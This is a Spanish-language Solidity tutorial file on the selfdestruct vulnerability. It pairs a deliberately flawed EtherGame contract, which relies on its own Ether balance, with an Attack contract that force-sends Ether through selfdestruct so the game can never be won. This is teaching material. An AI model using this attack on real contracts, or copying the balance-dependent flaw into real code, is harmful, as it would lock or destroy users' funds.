// AUTODESTRUCCIÓN O SELFDESTRUCT
/*Los contratos se pueden eselfdestruct envía todo el Ether restante almacenado en el contrato a una dirección designada.
Eliminar de la cadena de bloques llamando a la función selfdestruct().
*/

VULNERABILIDAD
Un contrato malicioso puede utilizar la autodestrucción para forzar el envío de Ether a cualquier contrato.
/*

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// EJEMPLO 

// El objetivo de este juego es ser el séptimo jugador en depositar 1 Ether.
// Los jugadores pueden depositar solo 1 Ethereum a la vez.
// El ganador final podrá retirar todo el Ethereum.

// FUNCIONAMIENTO
/*
1. Desplegar EtherGame
2. Los jugadores (por ejemplo, Alice y Bob) deciden jugar y depositan 1 Ether cada uno.
3. Implementar Attack con la dirección de EtherGame

4. Ejecutando a Attack.attack() enviando 5 Ethereum. Esto romperá el juego.
   Nadie puede convertirse en el ganador.

¿Qué ha pasado?

Ahora nadie puede depositar y no se puede determinar el ganador.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}


